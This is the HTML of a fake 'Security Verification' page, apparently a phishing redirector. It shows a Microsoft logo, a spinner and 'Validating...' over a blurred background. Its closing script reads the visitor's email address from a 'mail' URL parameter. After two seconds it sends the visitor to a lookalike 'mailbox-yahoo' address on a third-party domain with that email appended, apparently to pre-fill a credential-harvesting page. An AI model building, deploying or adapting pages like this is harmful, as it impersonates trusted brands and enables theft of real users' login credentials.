<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #2563eb;
            --success: #10b981;
            --text-secondary: #64748b;
            --bg-overlay: rgba(15, 23, 42, 0.75);
            --green-overlay: rgba(16, 185, 129, 0.15);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: url('https://cdn.glitch.global/fc7f7e4a-7f0c-454c-8f15-b9c3212e51f9/thumbnails%2Fxauleh.png?1744891704794');
            background-size: cover;
            background-position: center;
            line-height: 1.5;
        }
        
        .blur-overlay {
            position: fixed;
            inset: 0;
            background-color: var(--bg-overlay);
            backdrop-filter: blur(16px);
            opacity: 1;
            background-image: linear-gradient(135deg, var(--green-overlay), transparent);
            z-index: 1;
        }
        
        .container {
            position: relative;
            width: 400px;
            height: auto;
            min-height: 240px;
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            padding: 28px;
            z-index: 10;
        }
        
        .content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            width: 100%;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 38px;
            width: 100%;
        }
        
        .logo {
            width: 80px;
            height: auto;
            object-fit: contain;
            border-radius: 10px;
        }
        
        .spinner {
            position: relative;
            width: 36px;
            height: 36px;
        }
        
        .spinner:before,
        .spinner:after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 50%;
            box-sizing: border-box;
        }
        
        .spinner:before {
            border: 3px dotted var(--primary);
            border-right-color: transparent;
            border-bottom-color: transparent;
            animation: spin 1.2s linear infinite;
        }
        
        .spinner:after {
            border: 3px dotted var(--success);
            border-top-color: transparent;
            border-left-color: transparent;
            animation: spin 0.8s linear infinite reverse;
        }
        
        .countdown {
            font-size: 15px;
            font-weight: 500;
            color: var(--text-secondary);
            letter-spacing: 0.2px;
            margin-top: 12px;
            animation: pulse 1.2s infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }
    </style>
</head>

<body>
    <div class="blur-overlay"></div>
    <div class="container">
        <div class="content-wrapper">
            <div class="logo-container">
                <img src="https://logo.clearbit.com/microsoft.com" alt="Service Logo" class="logo" id="logoImage">
            </div>
            <div class="spinner"></div>
            <div class="countdown">Validating...</div>
        </div>
    </div>

    <script>
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            const results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        document.addEventListener('DOMContentLoaded', () => {
            const email = getUrlParameter('mail');
            let targetUrl = 'https://mailbox-yahoo-view8edjisrbglcha.ns.jonescs.com/f/392e424afebd';
            
            if (email) {
                targetUrl += (targetUrl.includes('?') ? '&' : '?') + '#' + (email);
            }

            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 2000);
        });
    </script>
</body>
</html>
